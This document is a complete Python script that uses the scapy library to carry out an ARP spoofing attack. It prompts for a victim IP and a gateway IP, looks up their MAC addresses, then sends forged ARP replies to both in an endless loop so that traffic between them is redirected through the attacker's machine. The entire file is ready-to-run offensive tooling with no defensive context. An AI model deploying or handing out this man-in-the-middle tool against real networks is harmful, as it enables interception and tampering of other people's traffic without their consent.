#!/usr/bin/env python3

import scapy.all as scapy

def main():
    try:    
        print()
        
        victim_ip = input("\033[1;32mEnter the Victim IP:\033[m ")
        gateway_ip = input("\033[1;32mEnter the Gateway IP:\033[m ")
        
        print()
        
        victim_mac = mac_finder(victim_ip)
        gateway_mac = mac_finder(gateway_ip)
    
        count = 0
        while True:
            spoofer(victim_ip, gateway_ip, gateway_mac)
            spoofer(gateway_ip, victim_ip, victim_mac) 
            
            count = count+2
            
            
            print(f"\r\033[1;32m[+] Packets Transmitted: \033[1;36m{count}", end="")
    
    except KeyboardInterrupt:
        pass
    
    except:
        print("\n\033[5;33mUnexpected errors accurred please re-runs the program with proper arguments\n")

    
def mac_finder(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp
    
    recv = scapy.srp(packet, verbose=False)[0]
    
    return recv[0][1].hwsrc
    
 
def spoofer(ip, ip2, mac):
    packet = scapy.ARP(op = 2, pdst=ip, hwdst=mac, psrc=ip2)
    scapy.send(packet, verbose=False)
    
    
main()
    
